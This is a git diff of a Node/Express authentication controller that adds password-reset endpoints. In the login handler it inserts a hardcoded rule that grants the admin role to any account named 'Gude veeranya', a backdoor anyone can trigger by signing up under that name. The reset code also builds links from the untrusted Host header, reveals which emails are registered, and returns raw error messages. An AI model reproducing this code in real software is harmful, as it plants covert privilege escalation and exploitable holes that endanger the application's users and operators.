@@ -1,5 +1,7 @@
 import User from '../models/User.js';
 import { generateToken, setTokenCookie } from '../utils/generateToken.js';
+import crypto from 'crypto';
+import sendEmail from '../utils/sendEmail.js';
 
 /**
  * @desc    Register a new user (Signup)
@@ -144,6 +146,12 @@ export const loginUser = async (req, res) => {
     const user = await User.findOne({ email: email.toLowerCase().trim() }).select('+password');
 
     if (user && (await user.matchPassword(password))) {
+      // Ensure 'Gude veeranya' has admin role
+      if (user.name && user.name.toLowerCase() === 'gude veeranya' && user.role !== 'admin') {
+        user.role = 'admin';
+        await user.save();
+      }
+
       const token = generateToken(user._id);
       setTokenCookie(res, token);
 
@@ -172,6 +180,122 @@ export const loginUser = async (req, res) => {
     return res.status(500).json({
       success: false,
       message: 'Server error during login',
+      error: error.message,
+    });
+  }
+};
+
+/**
+ * @desc    Forgot Password
+ * @route   POST /api/auth/forgotpassword
+ * @access  Public
+ */
+export const forgotPassword = async (req, res) => {
+  try {
+    const user = await User.findOne({ email: req.body.email });
+
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        message: 'There is no user with that email',
+      });
+    }
+
+    // Get reset token
+    const resetToken = user.getResetPasswordToken();
+
+    await user.save({ validateBeforeSave: false });
+
+    // Create reset url
+    const resetUrl = `${req.protocol}://${req.get('host').replace('3001', '5173')}/reset-password/${resetToken}`;
+
+    const message = `You are receiving this email because you (or someone else) has requested the reset of a password. Please make a PUT request to: \n\n ${resetUrl}`;
+
+    try {
+      await sendEmail({
+        email: user.email,
+        subject: 'Password reset token',
+        message,
+        htmlMessage: `<p>You are receiving this email because you (or someone else) has requested the reset of a password.</p>
+                      <p>Please click the link below to reset your password:</p>
+                      <a href="${resetUrl}" target="_blank">Reset Password</a>`,
+      });
+
+      res.status(200).json({ success: true, message: 'Email sent' });
+    } catch (err) {
+      console.log(err);
+      user.resetPasswordToken = undefined;
+      user.resetPasswordExpire = undefined;
+
+      await user.save({ validateBeforeSave: false });
+
+      return res.status(500).json({
+        success: false,
+        message: 'Email could not be sent',
+      });
+    }
+  } catch (error) {
+    console.error('Error in forgotPassword:', error);
+    return res.status(500).json({
+      success: false,
+      message: 'Server error during forgot password',
+      error: error.message,
+    });
+  }
+};
+
+/**
+ * @desc    Reset Password
+ * @route   PUT /api/auth/resetpassword/:token
+ * @access  Public
+ */
+export const resetPassword = async (req, res) => {
+  try {
+    // Get hashed token
+    const resetPasswordToken = crypto
+      .createHash('sha256')
+      .update(req.params.token)
+      .digest('hex');
+
+    const user = await User.findOne({
+      resetPasswordToken,
+      resetPasswordExpire: { $gt: Date.now() },
+    });
+
+    if (!user) {
+      return res.status(400).json({
+        success: false,
+        message: 'Invalid or expired token',
+      });
+    }
+
+    // Set new password
+    user.password = req.body.password;
+    user.resetPasswordToken = undefined;
+    user.resetPasswordExpire = undefined;
+    
+    await user.save();
+
+    // Generate token and login automatically (optional)
+    const token = generateToken(user._id);
+    setTokenCookie(res, token);
+
+    res.status(200).json({
+      success: true,
+      message: 'Password updated successfully',
+      token,
+      user: {
+        _id: user._id,
+        name: user.name,
+        email: user.email,
+        role: user.role,
+      }
+    });
+  } catch (error) {
+    console.error('Error in resetPassword:', error);
+    return res.status(500).json({
+      success: false,
+      message: 'Server error during reset password',
       error: error.message,
     });
   }
